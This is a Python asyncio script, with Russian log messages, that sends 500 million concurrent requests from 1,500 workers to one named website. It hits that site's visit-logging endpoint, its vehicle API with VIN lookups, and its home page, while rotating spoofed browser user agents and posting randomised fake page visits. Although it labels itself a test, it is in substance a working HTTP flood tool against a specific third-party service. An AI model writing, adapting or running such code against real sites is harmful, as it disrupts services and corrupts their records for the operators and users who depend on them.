import asyncio
import random
import secrets
import time
import uuid
from datetime import datetime, timezone

import aiohttp

# Список проверок: адрес + HTTP-метод + флаг ssl
CHECKS = [
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=VF1HJD40967428809", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=U5YPV81BHNL087801", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=JM3KFBDM3P0201488", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=JTME6RFV5RJ895216", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=TMBAR7NE7K0015421", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=C6I7ZFJSYX60T62JR", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=4Z93H0GZ16J5B9130", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/", "method": "GET", "ssl": True},
]

TOTAL_REQUESTS = 500000000
DELAY_BETWEEN_REQ = 0.0001
MAX_CONCURRENT = 1500


USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
    "Mozilla/5.0 (Linux; Android 10; TCL 20 Pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 TV Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 DMOST/1.0",
    "Mozilla/5.0 (Linux; Android 9; LG-U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; INFINIX GT 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]


def build_payload(request_num: int, worker_id: int) -> dict:
    iso_string = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")
    return {
        "requestId": f"req-{request_num}-w{worker_id}-{uuid.uuid4().hex}",
        "page": f"/probe/{uuid.uuid4().hex[:12]}",
        "timestamp": iso_string,
        "nonce": secrets.token_hex(8),
        "userAgent": random.choice(USER_AGENTS),
    }


request_counter = 0
success_count = 0
fail_count = 0
counter_lock = asyncio.Lock()


async def worker(session, worker_id):
    global request_counter, success_count, fail_count

    while True:
        async with counter_lock:
            if request_counter >= TOTAL_REQUESTS:
                break
            request_counter += 1
            current_request_num = request_counter

        check_cfg = CHECKS[(current_request_num - 1) % len(CHECKS)]
        payload = build_payload(current_request_num, worker_id)

        try:
            start_time = time.time()
            async with session.request(
                check_cfg["method"],
                check_cfg["url"],
                json=payload,
                timeout=5,
                ssl=check_cfg["ssl"],
            ) as response:
                duration = time.time() - start_time
                if response.status in (200, 201):
                    print(
                        f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                        f" (Цель: {check_cfg['url']}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с)"
                    )
                    async with counter_lock:
                        success_count += 1
                else:
                    print(
                        f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                        f" Сервер вернул код {response.status} для {check_cfg['url']}"
                    )
                    async with counter_lock:
                        fail_count += 1
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(
                f"[!] Запрос {current_request_num} (Воркер {worker_id}): Ошибка соединения"
                f" ({e}) для {check_cfg['url']}"
            )
            async with counter_lock:
                fail_count += 1

        await asyncio.sleep(DELAY_BETWEEN_REQ)


async def main():
    print("[*] Запуск асинхронного теста")
    print(f"[*] Целей для проверки: {len(CHECKS)}")
    print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")

    connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)

    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [
            asyncio.create_task(worker(session, worker_id))
            for worker_id in range(1, MAX_CONCURRENT + 1)
        ]
        await asyncio.gather(*workers)

    print("\n--- Итоги тестирования ---")
    print(f"Успешных запросов: {success_count}")
    print(f"Ошибок/сбоев: {fail_count}")


if __name__ == "__main__":
    import sys

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(main())
